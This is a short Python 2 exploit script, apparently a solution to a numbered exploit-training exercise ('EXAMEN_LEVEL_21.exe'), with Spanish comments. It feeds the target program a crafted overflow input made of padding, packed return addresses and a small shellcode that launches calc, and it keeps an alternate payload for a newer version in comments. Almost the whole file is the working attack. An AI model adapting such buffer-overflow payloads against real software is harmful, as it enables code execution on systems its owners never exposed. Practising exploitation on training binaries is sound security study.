
import struct
import random, string
from os import popen4

def randomword(length):
    return ''.join(random.choice(string.letters) for i in range(length))


shellcode="\xC7\x06\x63\x61\x6C\x63\xC6\x46\x04\x00\x56\xE8\x0C\x4C\x27\x00"


#stdin,stdout = popen4(r"C:\Users\ricnar\Desktop\21\EXAMEN_LEVEL_21_b.exe") #nueva version
stdin,stdout = popen4(r"C:\Users\ricnar\Desktop\21\EXAMEN_LEVEL_21.exe")
print stdin


a=randomword(1000-203)


print a


#cadena = "1024" + "\n"+ "calc\x00"+ (20-5)* "W"+struct.pack("<L",0x421000) +  200* "W"+struct.pack("<L",0x421000)+ a + '\n'+ struct.pack("<L",0x00404B34)+"\n" #nueva version


cadena = "1024" + "\n"+ "calc\x00"+ (20-5)* "W"+struct.pack("<L",0x18ff00) +  200* "W"+struct.pack("<L",0x18ff00)+ a +\
         '\n'+ struct.pack("<L",0x18ff00) * 0x10+ "AAAA" + struct.pack("<L",0x00417AC4)+ shellcode+"\n" #version original


print "Escribe: " + cadena
stdin.write(cadena)






